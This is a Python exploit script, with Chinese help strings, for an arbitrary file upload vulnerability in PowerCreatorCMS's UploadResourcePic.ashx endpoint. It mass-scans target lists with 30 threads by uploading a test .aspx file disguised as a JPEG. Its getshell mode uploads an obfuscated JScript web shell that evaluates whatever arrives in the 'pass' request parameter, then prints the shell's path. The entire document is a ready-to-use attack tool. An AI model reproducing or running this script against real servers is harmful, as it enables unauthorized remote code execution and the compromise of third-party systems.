import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    parse = argparse.ArgumentParser(description="PowerCreatorCMS UploadResourcePic 任意文件上传漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    parse.add_argument('-exp', '--exploit', dest='exp', type=str, help='上传一键webshell')
    args = parse.parse_args()
    url = args.url
    file = args.file
    exp = args.exp
    targets = []
    if url:
        check(args.url)

    elif file:
        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    else:
        getshell(args.exp)
    pool = Pool(30)
    pool.map(check, targets)


def check(target):
    url = f'{target}/upload/UploadResourcePic.ashx?ResourceID=8382'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-Type': 'multipart/form-data;boundary=---------------------------20873900192357278038549710136',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
    }

    data = """-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="qaz.aspx"
Content-Type: image/jpeg

<%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
-----------------------------20873900192357278038549710136--
    """
    try:
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and 'ASPX' in response.text:
            print(f'[*] {target} 存在漏洞')

        else:
            print(f'[-] {target}  不存在')
    except Exception as e:
        pass


def getshell(url):
    url = f"{url}/upload/UploadResourcePic.ashx?ResourceID=8382"
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-Type': 'multipart/form-data;boundary=---------------------------20873900192357278038549710136',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
    }
    # 注意缩进
    data = """-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="wsx.aspx"
Content-Type: image/jpeg

<% function Ek1496c9(){var GEPH="unsa",YACK="fe",C5M2=GEPH+YACK;return C5M2;}var PAY:String=Request["pass"];~eval/*Z8z22c3e12*/(PAY,Ek1496c9());%><%@Page Language = JS%>
-----------------------------20873900192357278038549710136--"""
    response = requests.post(url=url, data=data, headers=headers, verify=False)
    if response.status_code == 200 and 'rce.aspx' in response.text:
        print(response.text)
        print("shell地址：ip/ResourcePic/ODM4Mg==.ASPX")


if __name__ == '__main__':
    main()
